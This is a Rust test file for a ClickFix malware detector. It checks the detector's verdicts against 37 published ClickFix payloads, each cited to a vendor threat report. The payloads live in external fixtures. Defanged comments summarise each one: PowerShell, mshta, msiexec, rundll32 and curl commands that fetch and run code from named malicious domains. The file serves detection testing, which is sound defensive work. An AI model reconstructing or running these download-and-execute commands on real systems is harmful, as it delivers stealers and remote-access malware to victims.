use base64::{engine::general_purpose::STANDARD, Engine as _};
use clickfix_detect::{Detector, DetectorInput, PrefilterDecision, Verdict};
use emulator_core::HostPlatform;

#[derive(Debug, Clone, Copy)]
enum PublicationCompleteness {
    Complete,
    Truncated,
    Reconstructed,
    Representative,
}

#[derive(Clone, Copy)]
struct PayloadCase {
    id: &'static str,
    payload_b64: &'static str,
    publisher: &'static str,
    source_title: &'static str,
    source_url: &'static str,
    completeness: PublicationCompleteness,
}

const PROOFPOINT_SOURCE: &str =
    "https://www.proofpoint.com/us/blog/threat-insight/clipboard-compromise-powershell-self-pwn";
const UNIT42_SOURCE: &str = "https://raw.githubusercontent.com/PaloAltoNetworks/Unit42-timely-threat-intel/main/2024-08-28-IOCs-for-Lumman-Stealer-from-fake-human-captcha-copy-paste-script.txt";
const UNIT42_WEBDAV_SOURCE: &str = "https://raw.githubusercontent.com/PaloAltoNetworks/Unit42-timely-threat-intel/main/2026-08-05-New-Clickfix-Variant.txt";
const SEKOIA_SOURCE: &str = "https://www.sekoia.com/blog/clickfix-tactic-the-phantom-meet";
const HUNTRESS_STEGO_SOURCE: &str =
    "https://www.huntress.com/blog/clickfix-malware-buried-in-images";
const HUNTRESS_CASTLE_SOURCE: &str =
    "https://www.huntress.com/blog/clickfix-castleloader-backgroundfix";
const HUNTRESS_MATANBUCHUS_SOURCE: &str =
    "https://www.huntress.com/blog/clickfix-matanbuchus-astarionrat-analysis";
const FORTINET_SOURCE: &str =
    "https://www.fortinet.com/blog/threat-research/clickfix-to-command-a-full-powershell-attack-chain";
const CYBERPROOF_SOURCE: &str =
    "https://www.cyberproof.com/blog/beyond-powershell-analyzing-the-multi-action-clickfix-variant/";
const ESENTIRE_SOURCE: &str =
    "https://www.esentire.com/blog/unpacking-netsupport-rat-loaders-delivered-via-clickfix";
const RAPID7_SOURCE: &str =
    "https://www.rapid7.com/blog/post/ve-clickfix-phishing-campaign-fake-claude-installer/";
const ZSCALER_SOURCE: &str =
    "https://www.zscaler.com/blogs/security-research/coldriver-updates-arsenal-baitswitch-and-simplefix";
const ZSCALER_MLT_SOURCE: &str =
    "https://www.zscaler.com/blogs/security-research/technical-analysis-mltbackdoor";
const DFIR_SOURCE: &str =
    "https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/";
const BLACKCLOAK_SOURCE: &str = "https://kb.blackcloak.io/en/articles/9433217";
const RECORDED_FUTURE_SOURCE: &str =
    "https://assets.recordedfuture.com/insikt-report-pdfs/2026/cta-2026-0325.pdf";
const NETSKOPE_MACOS_SOURCE: &str =
    "https://www.netskope.com/blog/macos-clickfix-lures-deploy-applescript-stealer-persistent-rat";
const PASTESWITCH_SOURCE: &str = "https://www.techiemike.com/clickfix-fake-captcha/";
const HUNTIO_LINUX_SOURCE: &str =
    "https://hunt.io/blog/apt36-clickfix-campaign-indian-ministry-of-defence";
const PURPLESHIFT_SOURCE: &str = "https://purpleshift.io/articles/2026-08-24-clickfix/";

const PAYLOADS: [PayloadCase; 25] = [
        PayloadCase {
            id: "proofpoint-ta571-darkgate-2024-05-28",
            // Defanged: c[m]d /c ... p[o]w[e]rsh[e]ll IWR hXXps[:]//lashakhazhalia86dancer[.]com/c[.]txt ...
            payload_b64: include_str!(
                "real_world_payloads/proofpoint-ta571-darkgate-2024-05-28.b64"
            ),
            publisher: "Proofpoint",
            source_title: "From Clipboard to Compromise: A PowerShell Self-Pwn",
            source_url: PROOFPOINT_SOURCE,
            completeness: PublicationCompleteness::Complete,
        },
        PayloadCase {
            id: "proofpoint-ta571-netsupport-2024-05-28",
            // Defanged: c[m]d /c ... p[o]w[e]rsh[e]ll IWR hXXps[:]//cdn3535[.]shop/1[.]zip ... Expand-Archive ...
            payload_b64: include_str!("real_world_payloads/proofpoint-ta571-netsupport-2024-05-28.b64"),
            publisher: "Proofpoint",
            source_title: "From Clipboard to Compromise: A PowerShell Self-Pwn",
            source_url: PROOFPOINT_SOURCE,
            completeness: PublicationCompleteness::Complete,
        },
        PayloadCase {
            id: "proofpoint-ta571-darkgate-2024-05-17",
            // Defanged: c[m]d /c ... p[o]w[e]rsh[e]ll IWR hXXps[:]//jenniferwelsh[.]com/header[.]png ...
            payload_b64: include_str!("real_world_payloads/proofpoint-ta571-darkgate-2024-05-17.b64"),
            publisher: "Proofpoint",
            source_title: "From Clipboard to Compromise: A PowerShell Self-Pwn",
            source_url: PROOFPOINT_SOURCE,
            completeness: PublicationCompleteness::Complete,
        },
        PayloadCase {
            id: "unit42-lumma-pgrtmed-2024-08-28",
            // Defanged: m[s]h[t]a hXXps[:]//myapt67[.]s3[.]amazonaws[.]com/pgrtmed
            payload_b64: include_str!("real_world_payloads/unit42-lumma-pgrtmed-2024-08-28.b64"),
            publisher: "Unit 42",
            source_title:
                "Fake Human CAPTCHA Style Verification Pages Lead to Copy/Paste Script for Lumma Stealer",
            source_url: UNIT42_SOURCE,
            completeness: PublicationCompleteness::Complete,
        },
        PayloadCase {
            id: "unit42-lumma-pgrtx-2024-08-28",
            // Defanged: m[s]h[t]a hXXps[:]//myapt67[.]s3[.]amazonaws[.]com/pgrtx
            payload_b64: include_str!("real_world_payloads/unit42-lumma-pgrtx-2024-08-28.b64"),
            publisher: "Unit 42",
            source_title:
                "Fake Human CAPTCHA Style Verification Pages Lead to Copy/Paste Script for Lumma Stealer",
            source_url: UNIT42_SOURCE,
            completeness: PublicationCompleteness::Complete,
        },
        PayloadCase {
            id: "unit42-lumma-2ndhsoru-2024-08-28",
            // Defanged: m[s]h[t]a hXXps[:]//verif[.]dlvideosfre[.]click/2ndhsoru
            payload_b64: include_str!("real_world_payloads/unit42-lumma-2ndhsoru-2024-08-28.b64"),
            publisher: "Unit 42",
            source_title:
                "Fake Human CAPTCHA Style Verification Pages Lead to Copy/Paste Script for Lumma Stealer",
            source_url: UNIT42_SOURCE,
            completeness: PublicationCompleteness::Complete,
        },
        PayloadCase {
            id: "sekoia-phantom-meet-mshta",
            // Defanged: m[s]h[t]a hXXps[:]//googIedrivers[.]com/fix-error
            payload_b64: include_str!("real_world_payloads/sekoia-phantom-meet-mshta.b64"),
            publisher: "Sekoia",
            source_title: "ClickFix Tactic: The Phantom Meet",
            source_url: SEKOIA_SOURCE,
            completeness: PublicationCompleteness::Complete,
        },
        PayloadCase {
            id: "unit42-webdav-pcalua-2026-08-05",
            // Defanged: p[c]a[l]u[a][.]exe -a p[o]w[e]rsh[e]ll ... pushd \\<PAYLOAD_HOST>@SSL\ ... r[u]n[d]l[l]32 gc[.]key,#1
            payload_b64: include_str!("real_world_payloads/unit42-webdav-pcalua-2026-08-05.b64"),
            publisher: "Unit 42",
            source_title:
                "New ClickFix Variant Abuses the Legitimate Binary and WebDAV to Deploy Infostealer Capabilities",
            source_url: UNIT42_WEBDAV_SOURCE,
            completeness: PublicationCompleteness::Truncated,
        },
        PayloadCase {
            id: "unit42-webdav-davclnt-2026-08-05",
            // Defanged: r[u]n[d]l[l]32[.]exe ... d[a]v[c]l[n]t[.]dll,DavSetCookie @SSL hXXps[:]//[.]com/
            payload_b64: include_str!("real_world_payloads/unit42-webdav-davclnt-2026-08-05.b64"),
            publisher: "Unit 42",
            source_title:
                "New ClickFix Variant Abuses the Legitimate Binary and WebDAV to Deploy Infostealer Capabilities",
            source_url: UNIT42_WEBDAV_SOURCE,
            completeness: PublicationCompleteness::Truncated,
        },
        PayloadCase {
            id: "huntress-stego-loader-mshta",
            // Defanged: m[s]h[t]a hXXp[:]//81[.]0x5a[.]29[.]64/ebc/rps[.]gz
            payload_b64: include_str!("real_world_payloads/huntress-stego-loader-mshta.b64"),
            publisher: "Huntress",
            source_title: "ClickFix Gets Creative: Malware Buried in Images",
            source_url: HUNTRESS_STEGO_SOURCE,
            completeness: PublicationCompleteness::Complete,
        },
        PayloadCase {
            id: "huntress-castleloader-finger",
            // Defanged: %C[o]M[S]P[E]C% /k s^t^a^r^t ... f^^i^^n^^g^^e^^r user@cheeshomireciple[.]com ...
            payload_b64: include_str!("real_world_payloads/huntress-castleloader-finger.b64"),
            publisher: "Huntress",
            source_title: "ClickFix Removes Your Background but Leaves the Malware",
            source_url: HUNTRESS_CASTLE_SOURCE,
            completeness: PublicationCompleteness::Complete,
        },
        PayloadCase {
            id: "huntress-matanbuchus-msiexec",
            // Defanged: "C[:]\...\m[S]i[e]x[e]C[.]EXe" -PaCkAGe hXXp[:]\\binclloudapp[.]com\temp\..\...\466943 /q
            payload_b64: include_str!("real_world_payloads/huntress-matanbuchus-msiexec.b64"),
            publisher: "Huntress",
            source_title: "ClickFix, Matanbuchus 3.0, and AstarionRAT",
            source_url: HUNTRESS_MATANBUCHUS_SOURCE,
            completeness: PublicationCompleteness::Complete,
        },
        PayloadCase {
            id: "fortinet-pharmacynod-powershell",
            // Defanged: p[o]w[e]rsh[e]ll IEX ((IRM -Uri hXXps[:]//pharmacynod[.]com/Fix ...)[.]note[.]body)
            payload_b64: include_str!("real_world_payloads/fortinet-pharmacynod-powershell.b64"),
            publisher: "Fortinet FortiGuard Labs",
            source_title: "From ClickFix to Command: A Full PowerShell Attack Chain",
            source_url: FORTINET_SOURCE,
            completeness: PublicationCompleteness::Complete,
        },
        PayloadCase {
            id: "fortinet-pharmacynod-outfile-truncated",
            // Defanged: IWR ... -Uri hXXps[:]//pharmacynod[.]com//31133?... -OutFile <missing>
            payload_b64: include_str!(
                "real_world_payloads/fortinet-pharmacynod-outfile-truncated.b64"
            ),
            publisher: "Fortinet FortiGuard Labs",
            source_title: "From ClickFix to Command: A Full PowerShell Attack Chain",
            source_url: FORTINET_SOURCE,
            completeness: PublicationCompleteness::Truncated,
        },
        PayloadCase {
            id: "fortinet-pharmacynod-content",
            // Defanged: (IWR ... -Uri hXXps[:]//pharmacynod[.]com//35893?...)[.]content
            payload_b64: include_str!("real_world_payloads/fortinet-pharmacynod-content.b64"),
            publisher: "Fortinet FortiGuard Labs",
            source_title: "From ClickFix to Command: A Full PowerShell Attack Chain",
            source_url: FORTINET_SOURCE,
            completeness: PublicationCompleteness::Complete,
        },
        PayloadCase {
            id: "cyberproof-cmdkey-regsvr32",
            // Defanged: c[m]d[.]exe /c c[m]dkey /add:151[.]245[.]195[.]142 ... r[e]gsvr32 /s \\151[.]245[.]195[.]142\hi\demo[.]dll
            payload_b64: include_str!("real_world_payloads/cyberproof-cmdkey-regsvr32.b64"),
            publisher: "CyberProof",
            source_title: "Beyond PowerShell: Analyzing the Multi-Action ClickFix Variant",
            source_url: CYBERPROOF_SOURCE,
            completeness: PublicationCompleteness::Complete,
        },
        PayloadCase {
            id: "esentire-netsupport-webclient",
            // Defanged: p[o]w[e]rsh[e]ll ... Net[.]WebClient DownloadFile hXXps[:]//riverlino[.]com/U[.]GRE ...
            payload_b64: include_str!("real_world_payloads/esentire-netsupport-webclient.b64"),
            publisher: "eSentire",
            source_title: "Unpacking NetSupport RAT Loaders Delivered via ClickFix",
            source_url: ESENTIRE_SOURCE,
            completeness: PublicationCompleteness::Complete,
        },
        PayloadCase {
            id: "esentire-netsupport-streamreader",
            // Defanged: p[o]w[e]rsh[e]ll ... Net[.]WebRequest Create hXXps[:]//xunira[.]cloud/C[.]GRE ...
            payload_b64: include_str!("real_world_payloads/esentire-netsupport-streamreader.b64"),
            publisher: "eSentire",
            source_title: "Unpacking NetSupport RAT Loaders Delivered via ClickFix",
            source_url: ESENTIRE_SOURCE,
            completeness: PublicationCompleteness::Complete,
        },
        PayloadCase {
            id: "esentire-netsupport-msiexec-global-weekends",
            // Defanged: m[s]i[e]x[e]c[.]exe /i hXXps[:]//global-weekends[.]net/res/helprecord /qn ...
            payload_b64: include_str!(
                "real_world_payloads/esentire-netsupport-msiexec-global-weekends.b64"
            ),
            publisher: "eSentire",
            source_title: "Unpacking NetSupport RAT Loaders Delivered via ClickFix",
            source_url: ESENTIRE_SOURCE,
            completeness: PublicationCompleteness::Complete,
        },
        PayloadCase {
            id: "esentire-netsupport-msiexec-stradomi",
            // Defanged: m[s]i[e]x[e]c[.]exe /i hXXps[:]//stradomi[.]com/res/presentjudge /qn ...
            payload_b64: include_str!("real_world_payloads/esentire-netsupport-msiexec-stradomi.b64"),
            publisher: "eSentire",
            source_title: "Unpacking NetSupport RAT Loaders Delivered via ClickFix",
            source_url: ESENTIRE_SOURCE,
            completeness: PublicationCompleteness::Complete,
        },
        PayloadCase {
            id: "esentire-truncated-encoded-powershell",
            // Defanged: p[o]w[e]rsh[e]ll[.]exe -enc <publisher-truncated Base64>
            payload_b64: include_str!("real_world_payloads/esentire-truncated-encoded-powershell.b64"),
            publisher: "eSentire",
            source_title: "Unpacking NetSupport RAT Loaders Delivered via ClickFix",
            source_url: ESENTIRE_SOURCE,
            completeness: PublicationCompleteness::Truncated,
        },
        PayloadCase {
            id: "rapid7-claude-encoded-placeholder",
            // Defanged: c[:]\...\c[m]d[.]exe /v:on /c set x=p[o]w ... !x!!y! -E [ENCODED COMMAND]
            payload_b64: include_str!("real_world_payloads/rapid7-claude-encoded-placeholder.b64"),
            publisher: "Rapid7",
            source_title: "ClickFix Phishing Campaign Masquerading as a Claude Installer",
            source_url: RAPID7_SOURCE,
            completeness: PublicationCompleteness::Truncated,
        },
        PayloadCase {
            id: "zscaler-coldriver-rundll32",
            // Defanged: r[u]n[d]l[l]32[.]exe \\captchanom[.]top\check\machinerie[.]dll,verifyme
            payload_b64: include_str!("real_world_payloads/zscaler-coldriver-rundll32.b64"),
            publisher: "Zscaler ThreatLabz",
            source_title: "COLDRIVER Updates Its Arsenal: BAITSWITCH and SIMPLEFIX",
            source_url: ZSCALER_SOURCE,
            completeness: PublicationCompleteness::Complete,
        },
        PayloadCase {
            id: "zscaler-mltbackdoor-conhost",
            // Defanged: c[o]n[h]o[s]t[.]exe --headless c[m]d /c ... c[u]rl hXXps[:]//rs2y15sungu[.]com/d ... r[u]n[d]l[l]32 ...
            payload_b64: include_str!("real_world_payloads/zscaler-mltbackdoor-conhost.b64"),
            publisher: "Zscaler ThreatLabz",
            source_title: "Technical Analysis of MLTBackdoor",
            source_url: ZSCALER_MLT_SOURCE,
            completeness: PublicationCompleteness::Truncated,
        },
        PayloadCase {
            id: "dfir-interlock-trycloudflare",
            // Defanged: p[o]w[e]rsh[e]ll[.]exe ... Net[.]WebClient DownloadString hXXp[:]//deadly-programming-attorneys-our[.]trycloudflare[.]com | iex
            payload_b64: include_str!("real_world_payloads/dfir-interlock-trycloudflare.b64"),
            publisher: "The DFIR Report",
            source_title: "KongTuke FileFix Leads to New Interlock RAT Variant",
            source_url: DFIR_SOURCE,
            completeness: PublicationCompleteness::Complete,
        },
];

const CROSS_PLATFORM_PAYLOADS: [PayloadCase; 12] = [
    PayloadCase {
        id: "macos-blackcloak-l2j4-bash-curl",
        payload_b64: include_str!("real_world_payloads/macos-blackcloak-l2j4-bash-curl.b64"),
        publisher: "BlackCloak",
        source_title: "Social Engineering Meets Shell Script Malware",
        source_url: BLACKCLOAK_SOURCE,
        completeness: PublicationCompleteness::Complete,
    },
    PayloadCase {
        id: "macos-blackcloak-l2j4-update-chain",
        payload_b64: include_str!("real_world_payloads/macos-blackcloak-l2j4-update-chain.b64"),
        publisher: "BlackCloak",
        source_title: "Social Engineering Meets Shell Script Malware",
        source_url: BLACKCLOAK_SOURCE,
        completeness: PublicationCompleteness::Complete,
    },
    PayloadCase {
        id: "macos-recordedfuture-odyssey-base64",
        payload_b64: include_str!("real_world_payloads/macos-recordedfuture-odyssey-base64.b64"),
        publisher: "Recorded Future Insikt Group",
        source_title: "ClickFix Campaigns Targeting Windows and macOS",
        source_url: RECORDED_FUTURE_SOURCE,
        completeness: PublicationCompleteness::Complete,
    },
    PayloadCase {
        id: "macos-recordedfuture-odyssey-decoded",
        payload_b64: include_str!("real_world_payloads/macos-recordedfuture-odyssey-decoded.b64"),
        publisher: "Recorded Future Insikt Group",
        source_title: "ClickFix Campaigns Targeting Windows and macOS",
        source_url: RECORDED_FUTURE_SOURCE,
        completeness: PublicationCompleteness::Complete,
    },
    PayloadCase {
        id: "macos-recordedfuture-macsync-base64",
        payload_b64: include_str!("real_world_payloads/macos-recordedfuture-macsync-base64.b64"),
        publisher: "Recorded Future Insikt Group",
        source_title: "ClickFix Campaigns Targeting Windows and macOS",
        source_url: RECORDED_FUTURE_SOURCE,
        completeness: PublicationCompleteness::Complete,
    },
    PayloadCase {
        id: "macos-netskope-meow-osascript",
        payload_b64: include_str!("real_world_payloads/macos-netskope-meow-osascript.b64"),
        publisher: "Netskope Threat Labs",
        source_title: "macOS ClickFix Lures Deploy AppleScript Stealer & Persistent RAT",
        source_url: NETSKOPE_MACOS_SOURCE,
        completeness: PublicationCompleteness::Complete,
    },
    PayloadCase {
        id: "macos-netskope-meow-command-exec",
        payload_b64: include_str!("real_world_payloads/macos-netskope-meow-command-exec.b64"),
        publisher: "Netskope Threat Labs",
        source_title: "macOS ClickFix Lures Deploy AppleScript Stealer & Persistent RAT",
        source_url: NETSKOPE_MACOS_SOURCE,
        completeness: PublicationCompleteness::Complete,
    },
    PayloadCase {
        id: "macos-pasteswitch-export-zsh",
        payload_b64: include_str!("real_world_payloads/macos-pasteswitch-export-zsh.b64"),
        publisher: "Techie Mike / ADAMnetworks PasteSwitch",
        source_title: "ClickFix: The Fake CAPTCHA That Tricks You Into Hacking Yourself",
        source_url: PASTESWITCH_SOURCE,
        completeness: PublicationCompleteness::Truncated,
    },
    PayloadCase {
        id: "linux-huntio-apt36-mapeal-reconstructed",
        payload_b64: include_str!(
            "real_world_payloads/linux-huntio-apt36-mapeal-reconstructed.b64"
        ),
        publisher: "Hunt.io",
        source_title:
            "APT36-Style ClickFix Attack Spoofs Indian Ministry to Target Windows & Linux",
        source_url: HUNTIO_LINUX_SOURCE,
        completeness: PublicationCompleteness::Reconstructed,
    },
    PayloadCase {
        id: "linux-purpleshift-curl-bash-representative",
        payload_b64: include_str!(
            "real_world_payloads/linux-purpleshift-curl-bash-representative.b64"
        ),
        publisher: "Purpleshift",
        source_title: "Hack yourself: breaking down ClickFix",
        source_url: PURPLESHIFT_SOURCE,
        completeness: PublicationCompleteness::Representative,
    },
    PayloadCase {
        id: "linux-purpleshift-wget-sh-representative",
        payload_b64: include_str!(
            "real_world_payloads/linux-purpleshift-wget-sh-representative.b64"
        ),
        publisher: "Purpleshift",
        source_title: "Hack yourself: breaking down ClickFix",
        source_url: PURPLESHIFT_SOURCE,
        completeness: PublicationCompleteness::Representative,
    },
    PayloadCase {
        id: "linux-purpleshift-download-chmod-representative",
        payload_b64: include_str!(
            "real_world_payloads/linux-purpleshift-download-chmod-representative.b64"
        ),
        publisher: "Purpleshift",
        source_title: "Hack yourself: breaking down ClickFix",
        source_url: PURPLESHIFT_SOURCE,
        completeness: PublicationCompleteness::Representative,
    },
];

fn payloads() -> Vec<PayloadCase> {
    PAYLOADS
        .into_iter()
        .chain(CROSS_PLATFORM_PAYLOADS)
        .collect()
}

#[allow(clippy::too_many_lines)]
fn fixture_sha256(id: &str) -> &'static str {
    match id {
        "proofpoint-ta571-darkgate-2024-05-28" => {
            "05e622314befc57f0825c6505b75e23d1208c9d01495a4c5e044d7e14a66593d"
        }
        "proofpoint-ta571-netsupport-2024-05-28" => {
            "aae245c459bd79a1130f4f747acd7927a07094a20ff7144aaf83caa0827e45af"
        }
        "proofpoint-ta571-darkgate-2024-05-17" => {
            "9357b7ee9f0431d46bdec3d647e079b39688c4e402eef4cd4175332ab06432a2"
        }
        "unit42-lumma-pgrtmed-2024-08-28" => {
            "9f7990d62140073c7daae29b3d7bbdea587a23778b2eaf03b74a0afce6179f91"
        }
        "unit42-lumma-pgrtx-2024-08-28" => {
            "a428bb38c84a44306414150cf4bf92a4a9c6d664cf56e491b810acf7d91fe2de"
        }
        "unit42-lumma-2ndhsoru-2024-08-28" => {
            "e07dab67b142ae4341208850325d74d535d1bfb460c34d550f902934ab6ad5d8"
        }
        "sekoia-phantom-meet-mshta" => {
            "cf06f0f5bd45195e14c68bd8550147cba4f7ec2a1bdd5495701c0ba5ba1b03c1"
        }
        "unit42-webdav-pcalua-2026-08-05" => {
            "bd07cc32abbcf08672d65105ec90f7db439b645bcce126d1d407404ca69b8829"
        }
        "unit42-webdav-davclnt-2026-08-05" => {
            "0d6e97c6a4da1463dd283303523c05d38b7d3ccb5968d0b24013ef567defbb6c"
        }
        "huntress-stego-loader-mshta" => {
            "1b5ae66efceb2e493dd5c6b79e86d47741bb78ca4fb74689ed17fdb498f2d948"
        }
        "huntress-castleloader-finger" => {
            "c1c1aae10f788dc08d4aefd6982750e627c1aaea0327bb239853cb3c4da13fea"
        }
        "huntress-matanbuchus-msiexec" => {
            "6cb5c70f754db6780cab0d1630e561837bcd3f0f96f1cf4b3c9601673261df21"
        }
        "fortinet-pharmacynod-powershell" => {
            "827a87c1bc9af5d2faf1a3b8cfb0b5395766e37340b4d9f9fe69c7368ae4c959"
        }
        "fortinet-pharmacynod-outfile-truncated" => {
            "d92c8ca5623fc21981da442c3ef0cdc6a01305b285ec88cfa3533e8fdaf81c63"
        }
        "fortinet-pharmacynod-content" => {
            "1a05287d7cbb8bb2109da97775dc5a4e3a5f9c78bb2f5e78d03c13e90e70c84f"
        }
        "cyberproof-cmdkey-regsvr32" => {
            "af212009b471f18332559dba12fa33b4ad1c7a8556a29fe471ee5e672a4ead37"
        }
        "esentire-netsupport-webclient" => {
            "fbba23120a564e52ce4db6a6212bdd57142509c0c397ec88fafdbeaec2dbadb5"
        }
        "esentire-netsupport-streamreader" => {
            "bbdb0ec462af851d0ba324516c3a060e16f2b9ed73876ad9c97b385460543f68"
        }
        "esentire-netsupport-msiexec-global-weekends" => {
            "daed9717d24a6e86f5b6080dbf3262eac8b1d5448cb9f5edfb7dd35320b17525"
        }
        "esentire-netsupport-msiexec-stradomi" => {
            "42ab16e6129122bd702473d252180ccfcfd3040e24cbf9057928cfd08a021b1e"
        }
        "esentire-truncated-encoded-powershell" => {
            "9d9b64b85d6f202a796d43e375402d7d51a5f4079ca0b121f1760e1c1a744732"
        }
        "rapid7-claude-encoded-placeholder" => {
            "a2f01eb4249147025c3a9b14a9d51fbea1c4a67003f720c143c19c076e2d972f"
        }
        "zscaler-coldriver-rundll32" => {
            "159d0532b553ea2b6b013b2a29f41412ad541ec76122a2207cc6562cdd140c54"
        }
        "zscaler-mltbackdoor-conhost" => {
            "7cc3ec52c0031b4259e4cb7336de31f96c8e50f3aa43fa60cbd60247b31390b6"
        }
        "dfir-interlock-trycloudflare" => {
            "781dae5dc89438bbc182adfd23c5eb7453cad8ba527a7ca472d22b6e072e20ef"
        }
        "macos-blackcloak-l2j4-bash-curl" => {
            "ae0741b014adedf7283e1e4b60a631534ee73c6ef84f7cb48e02a6e7c24e8251"
        }
        "macos-blackcloak-l2j4-update-chain" => {
            "8c6e08e16ded542b482977a3f0e0dba8be9a776119b67f08a2aba10929a9a8a1"
        }
        "macos-recordedfuture-odyssey-base64" => {
            "6edd1ea4af38ad09b0417789606ae8e2bc78d04f5eac093167bb599b33a5378b"
        }
        "macos-recordedfuture-odyssey-decoded" => {
            "305f44084dda2a2bc3721ebe1e519f8d3bb5589ed4328513fb3b33448e57a1fd"
        }
        "macos-recordedfuture-macsync-base64" => {
            "4037f59d7b048d9a832f731a26d8117bb5d830bd4c85455d6dff9a1954f342b2"
        }
        "macos-netskope-meow-osascript" => {
            "7bbcbbc12673f5f678ead2b07959dd110b9c231e30a3eafbe7f1a34077eb90a3"
        }
        "macos-netskope-meow-command-exec" => {
            "a424728d7f696814f8826e01761a4b5fd54d3d391c248a317984a6d4ab01496a"
        }
        "macos-pasteswitch-export-zsh" => {
            "f18244bd5dc526b066f68c6bdf3ad7c374c32be592ff91d9bacc206f0c7c637a"
        }
        "linux-huntio-apt36-mapeal-reconstructed" => {
            "612d374c864221bbbacb6cab829101cd2c32640d0550d2cb276699c14727c2f8"
        }
        "linux-purpleshift-curl-bash-representative" => {
            "cfad3b8534be56fe127b35a664fb8e422fb8e79c0cb95440f22e0537b1e2e81f"
        }
        "linux-purpleshift-wget-sh-representative" => {
            "769daf46b54a91083a717228bc4b2a2ed1afd87a5e12e800ca46aa56b97121db"
        }
        "linux-purpleshift-download-chmod-representative" => {
            "de3bb09e5229e947d54005f7349744dc0d0446e9d7dd5233b0ddeb3bac6b8557"
        }
        _ => panic!("missing fixture hash for {id}"),
    }
}

fn decode_payload(case: &PayloadCase) -> String {
    String::from_utf8(
        STANDARD
            .decode(case.payload_b64.trim())
            .unwrap_or_else(|error| panic!("{} has invalid Base64: {error}", case.id)),
    )
    .unwrap_or_else(|error| panic!("{} is not UTF-8: {error}", case.id))
}

fn detector_input(case: &PayloadCase, payload: &str) -> DetectorInput {
    if case.id.starts_with("macos-") {
        DetectorInput::bash_script(payload)
    } else if case.id.starts_with("linux-") {
        DetectorInput::linux_shell_script(payload)
    } else if matches!(
        case.id,
        "fortinet-pharmacynod-outfile-truncated" | "fortinet-pharmacynod-content"
    ) {
        DetectorInput::powershell_script(payload)
    } else {
        DetectorInput::raw_command(payload)
    }
}

fn expected_verdict(id: &str) -> Verdict {
    match id {
        "fortinet-pharmacynod-outfile-truncated" | "fortinet-pharmacynod-content" => {
            Verdict::Benign
        }
        "esentire-truncated-encoded-powershell" | "rapid7-claude-encoded-placeholder" => {
            Verdict::Suspicious
        }
        _ => Verdict::Malicious,
    }
}

#[test]
fn published_payloads_are_decoded_without_runtime_rewriting() {
    for case in payloads() {
        let payload = decode_payload(&case);
        assert_eq!(
            Detector::prefilter(&payload).decision,
            PrefilterDecision::Candidate,
            "{} was missed by the candidate prefilter",
            case.id
        );
        let report = Detector::default()
            .analyze(detector_input(&case, &payload))
            .unwrap_or_else(|error| panic!("{} failed analysis: {error}", case.id));

        assert_eq!(
            report.input.size,
            payload.len(),
            "{} was trimmed or rewritten after Base64 decoding",
            case.id
        );
        assert_eq!(
            report.input.sha256.as_deref(),
            Some(fixture_sha256(case.id)),
            "{} decoded payload changed; verify it against the cited publication and refanging policy before updating the hash",
            case.id
        );
        assert!(!case.publisher.is_empty());
        assert!(!case.source_title.is_empty());
        assert!(case.source_url.starts_with("https://"));
        assert!(matches!(
            case.completeness,
            PublicationCompleteness::Complete
                | PublicationCompleteness::Truncated
                | PublicationCompleteness::Reconstructed
                | PublicationCompleteness::Representative
        ));

        let event_kinds = report
            .trace
            .iter()
            .map(|event| format!("{:?}", event.kind))
            .collect::<Vec<_>>()
            .join(",");
        eprintln!(
            "{}: verdict={:?} risk={} confidence={} unsupported={} events={event_kinds}",
            case.id,
            report.verdict,
            report.risk.score,
            report.confidence.score,
            report.confidence.unsupported_operations,
        );
    }
}

#[test]
fn published_payloads_match_behavioral_verdict_expectations() {
    let mismatches = payloads()
        .into_iter()
        .filter_map(|case| {
            let payload = decode_payload(&case);
            let report = Detector::default()
                .analyze(detector_input(&case, &payload))
                .unwrap();
            let expected = expected_verdict(case.id);
            (report.verdict != expected).then_some((
                case.id,
                expected,
                report.verdict,
                report.risk.score,
            ))
        })
        .collect::<Vec<_>>();

    assert!(
        mismatches.is_empty(),
        "published payload verdict mismatches: {mismatches:?}"
    );
}

#[test]
fn complete_payloads_produce_detection_evidence() {
    let missing = payloads()
        .into_iter()
        .filter(|case| matches!(case.completeness, PublicationCompleteness::Complete))
        .filter_map(|case| {
            let payload = decode_payload(&case);
            let report = Detector::default()
                .analyze(detector_input(&case, &payload))
                .unwrap();
            report.findings.is_empty().then_some(case.id)
        })
        .collect::<Vec<_>>();

    assert!(
        missing.is_empty(),
        "complete published payloads produced no detection evidence: {missing:?}"
    );
}

#[test]
fn cross_platform_payloads_use_expected_hosts_and_behavioral_rules() {
    for case in CROSS_PLATFORM_PAYLOADS {
        let payload = decode_payload(&case);
        let report = Detector::default()
            .analyze(detector_input(&case, &payload))
            .unwrap();

        let expected_platform = if case.id.starts_with("macos-") {
            HostPlatform::MacOs
        } else {
            HostPlatform::Linux
        };
        assert_eq!(report.host_platform, expected_platform, "{}", case.id);
        assert!(!report.findings.is_empty(), "{}", case.id);
    }

    for (id, rule) in [
        (
            "macos-recordedfuture-odyssey-base64",
            "shell.encoded-remote-command",
        ),
        (
            "macos-recordedfuture-macsync-base64",
            "shell.encoded-remote-command",
        ),
        (
            "macos-netskope-meow-command-exec",
            "chain.decode-write-execute",
        ),
        (
            "linux-huntio-apt36-mapeal-reconstructed",
            "chain.download-write-execute",
        ),
    ] {
        let case = CROSS_PLATFORM_PAYLOADS
            .iter()
            .find(|case| case.id == id)
            .expect("cross-platform fixture exists");
        let payload = decode_payload(case);
        let report = Detector::default()
            .analyze(detector_input(case, &payload))
            .unwrap();
        assert!(
            report
                .findings
                .iter()
                .any(|finding| finding.rule_id == rule),
            "{id} missing {rule}: {:?}",
            report
                .findings
                .iter()
                .map(|finding| finding.rule_id.as_str())
                .collect::<Vec<_>>()
        );
    }
}
